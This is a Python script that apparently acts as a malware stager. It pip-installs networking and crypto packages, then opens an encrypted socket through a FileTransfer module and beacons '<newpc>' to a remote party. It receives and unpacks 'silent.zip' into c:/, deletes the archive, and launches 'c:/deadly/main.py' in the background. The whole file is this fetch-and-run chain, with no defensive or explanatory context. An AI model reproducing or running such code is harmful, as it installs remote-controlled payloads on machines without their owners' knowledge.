import os
import sys
import zipfile
import subprocess


def main():
    print(sys.path)
    subprocess.check_call([sys.executable, '-m', 'ensurepip'])
    packages = ["scapy", "rsa", "Pycryptodome", "tqdm"]
    for package in packages:
        subprocess.run([r"c:/myenv/Scripts/python", "-m", "pip", "install", package])
    import FileTransfer
    transfered = False
    while (not transfered):
        client_socket = ''
        try:
            client_socket, encryption_key = FileTransfer.initiate()
            client_socket.send(FileTransfer.encrypt('<newpc>'.encode(), encryption_key))
            data = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
            print(data)
            FileTransfer.receive(client_socket, encryption_key, data, 'c:/')
            transfered = True
        except Exception as e:
            print(str(e))
        finally:
            if(client_socket):
                client_socket.close()

    with zipfile.ZipFile('c:/silent.zip', 'r') as zip:
        zip.extractall('c:/')
    if os.path.isfile('c:/silent.zip'):
        os.remove('c:/silent.zip')
    os.chdir('c:/deadly/')
    os.popen('start python c:/deadly/main.py')


if __name__ == '__main__':
    main()
